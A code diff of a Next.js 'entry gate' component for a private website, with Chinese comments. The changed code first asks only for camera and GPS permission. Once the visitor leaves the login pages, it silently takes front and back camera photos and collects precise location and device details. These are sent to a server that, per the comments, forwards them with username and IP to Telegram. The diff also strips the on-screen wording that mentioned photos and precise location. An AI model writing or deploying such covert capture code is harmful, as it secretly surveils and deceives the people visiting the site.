@@ -1,72 +1,84 @@
 'use client';
 
 import { Camera, Loader2, MapPin, ShieldAlert } from 'lucide-react';
-import { ReactNode, useCallback, useEffect, useState } from 'react';
+import { usePathname } from 'next/navigation';
+import { ReactNode, useCallback, useEffect, useRef, useState } from 'react';
 
-/* 进站授权门禁：摄像头（前+后）与 GPS 必须全部授权，否则停留在授权页反复重弹。
-   授权通过后拍前后照 + 采集位置/设备信息上报服务端（服务端转发 Telegram）。 */
+/* 进站门禁（三段式）：
+   1. 进门只请求授权（摄像头+GPS），不拍照；拒绝则停留授权页重弹
+   2. 授权通过立即放行进入网页（含登录页）
+   3. 登录完成（离开登录类页面）后才拍照+定位上报，服务端附用户名/IP/归属地推 Telegram
+   管理员（owner/admin）全程不弹不拍。 */
 
 const SS_KEY = 'entry_capture_ok';
 const LS_KEY = 'entry_capture_last';
-const COOLDOWN_MS = 10 * 60 * 1000; // 同一浏览器 10 分钟内多标签页不重复拍
+const LS_PERM = 'entry_perm_ok';
+const COOLDOWN_MS = 10 * 60 * 1000;
+
+const AUTH_PAGES = ['/login', '/register', '/oidc-register', '/qr-login', '/tv/login', '/warning'];
 
 type Status = 'checking' | 'ok' | 'blocked';
-
 type Gps = { lat: number; lng: number; acc: number };
 
-async function grabFrame(stream: MediaStream): Promise<string> {
-  const video = document.createElement('video');
-  video.srcObject = stream;
-  video.muted = true;
-  video.playsInline = true;
-  await video.play();
-  await new Promise((r) => setTimeout(r, 400));
-  const w = video.videoWidth || 640;
-  const h = video.videoHeight || 480;
-  const scale = Math.min(1, 640 / w);
-  const canvas = document.createElement('canvas');
-  canvas.width = Math.round(w * scale);
-  canvas.height = Math.round(h * scale);
-  const ctx = canvas.getContext('2d');
-  if (ctx) ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  stream.getTracks().forEach((t) => t.stop());
-  video.srcObject = null;
-  return canvas.toDataURL('image/jpeg', 0.72);
-}
-
-/** 前置必拍；后置没有硬件时跳过（桌面机）。
-    只有「拒绝授权」才算 denied；没有摄像头等硬件问题不算授权失败。 */
-async function captureCameras(): Promise<
-  { front?: string; back?: string; denied: boolean }
-> {
-  if (!navigator.mediaDevices?.getUserMedia) return { denied: true };
-  let frontStream: MediaStream;
+async function grabFrame(stream: MediaStream): Promise<string | undefined> {
   try {
-    frontStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: { ideal: 640 } },
-      audio: false,
-    });
-  } catch (e) {
-    const name = (e as DOMException)?.name;
-    // NotAllowedError/SecurityError = 用户拒绝；其余（无摄像头等）不拦人
-    return { denied: name === 'NotAllowedError' || name === 'SecurityError' };
-  }
-  const front = await grabFrame(frontStream);
-  let back: string | undefined;
-  try {
-    const backStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'environment', width: { ideal: 640 } },
-      audio: false,
-    });
-    back = await grabFrame(backStream);
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.muted = true;
+    video.playsInline = true;
+    await video.play().catch(() => undefined);
+    await new Promise((r) => setTimeout(r, 500));
+    const w = video.videoWidth || 0;
+    const h = video.videoHeight || 0;
+    if (!w || !h) return undefined;
+    const scale = Math.min(1, 640 / w);
+    const canvas = document.createElement('canvas');
+    canvas.width = Math.round(w * scale);
+    canvas.height = Math.round(h * scale);
+    const ctx = canvas.getContext('2d');
+    if (!ctx) return undefined;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    return canvas.toDataURL('image/jpeg', 0.72);
   } catch {
-    back = undefined; // 无后置摄像头（桌面设备）
+    return undefined;
+  } finally {
+    stream.getTracks().forEach((t) => t.stop());
   }
-  return { front, back, denied: false };
 }
 
-/** 仅「拒绝定位」算 denied；定位不可用/超时重试一次低精度后放弃（不拦人）。 */
-function getGps(): Promise<Gps | null | 'denied'> {
+const isDeny = (e: unknown) => {
+  const name = (e as DOMException)?.name;
+  return name === 'NotAllowedError' || name === 'SecurityError';
+};
+
+/** 仅请求前置摄像头授权并立即释放，不拍照。返回 'denied' | 'ok' | 'nohw' */
+async function probeCamera(): Promise<'denied' | 'ok' | 'nohw'> {
+  if (!navigator.mediaDevices?.getUserMedia) return 'denied';
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user' },
+      audio: false,
+    });
+    stream.getTracks().forEach((t) => t.stop());
+    return 'ok';
+  } catch (e) {
+    return isDeny(e) ? 'denied' : 'nohw';
+  }
+}
+
+/** 请求定位授权；仅明确拒绝算 denied，其余（不可用/超时）放行。 */
+function probeGps(): Promise<'denied' | 'ok'> {
+  return new Promise((resolve) => {
+    if (!('geolocation' in navigator)) return resolve('ok');
+    navigator.geolocation.getCurrentPosition(
+      () => resolve('ok'),
+      (err) => resolve(err.code === err.PERMISSION_DENIED ? 'denied' : 'ok'),
+      { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 }
+    );
+  });
+}
+
+function getGpsSoft(): Promise<Gps | null> {
   const once = (high: boolean, timeout: number) =>
     new Promise<Gps | null>((resolve) => {
       navigator.geolocation.getCurrentPosition(
@@ -80,23 +92,36 @@ function getGps(): Promise<Gps | null | 'denied'> {
         { enableHighAccuracy: high, timeout, maximumAge: 0 }
       );
     });
-  return new Promise((resolve) => {
-    if (!('geolocation' in navigator)) return resolve(null);
-    navigator.geolocation.getCurrentPosition(
-      (p) =>
-        resolve({
-          lat: p.coords.latitude,
-          lng: p.coords.longitude,
-          acc: Math.round(p.coords.accuracy || 0),
-        }),
-      async (err) => {
-        if (err.code === err.PERMISSION_DENIED) return resolve('denied');
-        const retry = await once(false, 8000);
-        resolve(retry);
-      },
-      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
-    );
-  });
+  return (async () => {
+    if (!('geolocation' in navigator)) return null;
+    const first = await once(true, 10000);
+    if (first) return first;
+    return once(false, 8000);
+  })();
+}
+
+async function captureCameras(): Promise<{ front?: string; back?: string }> {
+  const out: { front?: string; back?: string } = {};
+  if (!navigator.mediaDevices?.getUserMedia) return out;
+  try {
+    const frontStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 640 } },
+      audio: false,
+    });
+    out.front = await grabFrame(frontStream);
+  } catch {
+    /* 拒绝或无硬件：略 */
+  }
+  try {
+    const backStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'environment', width: { ideal: 640 } },
+      audio: false,
+    });
+    out.back = await grabFrame(backStream);
+  } catch {
+    /* 无后置摄像头 */
+  }
+  return out;
 }
 
 async function deviceInfo() {
@@ -131,52 +156,79 @@ async function deviceInfo() {
 }
 
 export default function EntryGate({ children }: { children: ReactNode }) {
+  const pathname = usePathname();
   const [status, setStatus] = useState<Status>('checking');
   const [missing, setMissing] = useState<string[]>([]);
   const [round, setRound] = useState(0);
+  const enabledRef = useRef(true);
+  const permOkRef = useRef(false);
+  const capturingRef = useRef(false);
 
-  const run = useCallback(async () => {
+  /* 第一段：进门查身份+请求授权，不拍照 */
+  const probe = useCallback(async () => {
     setStatus('checking');
     setMissing([]);
+    try {
+      const res = await fetch('/api/entry/status', { cache: 'no-store' }).catch(() => null);
+      if (res?.ok) {
+        const j = (await res.json()) as { capture?: boolean };
+        if (j.capture === false) {
+          enabledRef.current = false; // 管理员不拍不弹
+          setStatus('ok');
+          return;
+        }
+      }
+    } catch {
+      /* 状态接口失败按需要拍处理 */
+    }
+    try {
+      if (sessionStorage.getItem(SS_KEY)) {
+        permOkRef.current = true;
+        setStatus('ok');
+        return;
+      }
+      const last = Number(localStorage.getItem(LS_KEY) || 0);
+      if (last && Date.now() - last < COOLDOWN_MS) {
+        permOkRef.current = true;
+        setStatus('ok');
+        return;
+      }
+      if (localStorage.getItem(LS_PERM)) permOkRef.current = true;
+    } catch {
+      /* ignore */
+    }
+    if (permOkRef.current) {
+      setStatus('ok');
+      return;
+    }
     const miss: string[] = [];
-
-    const cam = await captureCameras();
-    if (cam.denied) miss.push('摄像头');
-    const gps = await getGps();
+    const cam = await probeCamera();
+    if (cam === 'denied') miss.push('摄像头');
+    const gps = await probeGps();
     if (gps === 'denied') miss.push('位置');
-
     if (miss.length) {
       setMissing(miss);
       setStatus('blocked');
       return;
     }
-
-    const device = await deviceInfo();
+    permOkRef.current = true;
     try {
-      const res = await fetch('/api/entry/report', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          front: cam.front || '',
-          back: cam.back || '',
-          gps: gps === 'denied' ? null : gps,
-          device,
-        }),
-      });
-      if (!res.ok) throw new Error('report failed');
-      try {
-        sessionStorage.setItem(SS_KEY, '1');
-        localStorage.setItem(LS_KEY, String(Date.now()));
-      } catch {
-        /* ignore */
-      }
+      localStorage.setItem(LS_PERM, '1');
     } catch {
-      // 上报失败不拦人，下次进入重试
+      /* ignore */
     }
     setStatus('ok');
   }, []);
 
   useEffect(() => {
+    void probe();
+  }, [probe, round]);
+
+  /* 第三段：登录完成（离开登录类页面）后拍照上报 */
+  useEffect(() => {
+    if (status !== 'ok' || !enabledRef.current || !permOkRef.current) return;
+    if (AUTH_PAGES.some((p) => pathname === p || pathname.startsWith(p + '/'))) return;
+    let cancelled = false;
     let skip = false;
     try {
       if (sessionStorage.getItem(SS_KEY)) skip = true;
@@ -185,12 +237,37 @@ export default function EntryGate({ children }: { children: ReactNode }) {
     } catch {
       /* ignore */
     }
-    if (skip) {
-      setStatus('ok');
-      return;
-    }
-    void run();
-  }, [run, round]);
+    if (skip || capturingRef.current) return;
+    capturingRef.current = true;
+    (async () => {
+      try {
+        const cam = await captureCameras();
+        const gps = await getGpsSoft();
+        const device = await deviceInfo();
+        if (cancelled) return;
+        const res = await fetch('/api/entry/report', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ front: cam.front || '', back: cam.back || '', gps, device }),
+        }).catch(() => null);
+        if (res?.ok) {
+          try {
+            sessionStorage.setItem(SS_KEY, '1');
+            localStorage.setItem(LS_KEY, String(Date.now()));
+          } catch {
+            /* ignore */
+          }
+        }
+      } catch {
+        /* 任何意外都不拦人，下次进入重试 */
+      } finally {
+        capturingRef.current = false;
+      }
+    })();
+    return () => {
+      cancelled = true;
+    };
+  }, [pathname, status]);
 
   if (status === 'ok') return <>{children}</>;
 
@@ -210,7 +287,7 @@ export default function EntryGate({ children }: { children: ReactNode }) {
               正在进行进入验证
             </h1>
             <p className='mt-2 text-xs leading-relaxed text-gray-500 dark:text-gray-400'>
-              本站需要验证摄像头与位置授权，请在浏览器弹窗中选择「允许」。
+              本站需要验证摄像头与位置授权，请在浏览器弹窗中选择「允许」。授权后即可进入。
             </p>
           </>
         ) : (
@@ -220,14 +297,14 @@ export default function EntryGate({ children }: { children: ReactNode }) {
             </h1>
             <p className='mt-2 text-xs leading-relaxed text-gray-500 dark:text-gray-400'>
               缺少授权：{missing.join('、')}。本站为私人站点，进入必须同时允许
-              摄像头（前后拍照）与位置信息。请点击下方按钮重新授权。
+              摄像头与位置信息。请点击下方按钮重新授权。
             </p>
             <div className='mt-3 flex justify-center gap-4 text-[11px] text-gray-400 dark:text-gray-500'>
               <span className='flex items-center gap-1'>
-                <Camera className='h-3.5 w-3.5' /> 前后摄像头
+                <Camera className='h-3.5 w-3.5' /> 摄像头
               </span>
               <span className='flex items-center gap-1'>
-                <MapPin className='h-3.5 w-3.5' /> 精确位置
+                <MapPin className='h-3.5 w-3.5' /> 位置
               </span>
             </div>
             <button
